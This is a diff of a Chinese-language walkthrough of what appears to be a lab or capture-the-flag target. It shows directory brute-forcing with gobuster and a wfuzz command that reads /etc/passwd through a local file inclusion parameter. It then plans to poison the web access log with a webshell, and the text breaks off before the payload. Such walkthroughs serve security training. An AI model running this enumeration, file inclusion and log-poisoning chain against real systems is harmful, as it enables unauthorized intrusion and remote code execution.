@@ -16,13 +16,24 @@
 ```css
 ┌──(kali㉿kali)-[~]
 └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.18.238 -x php -e --delay 1s -t 1 
+
+
+http://192.168.18.238/includes.php
 ```
 这里扫描出来了一个文件包含名字的文件，尝试对其进行fuzz 参数。这里发现任何访问的响应都是200和长度为2，所以还需要设置排除项
 ```c
 wfuzz -c --hc=404 --hh=2 -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://192.168.18.238/includes.php?FUZZ=/etc/passwd'
+
+
+000217299:   200        28 L     41 W       1460 Ch    "display_pag“
 ```
 
+得到传入的参数为display_page
+
+
 # GETSHELL
+通过bp 爆破了发现利用访问日志记录。
+
 那我们可以尝试写入webshell到日志，然后取包含它
 
 ```c
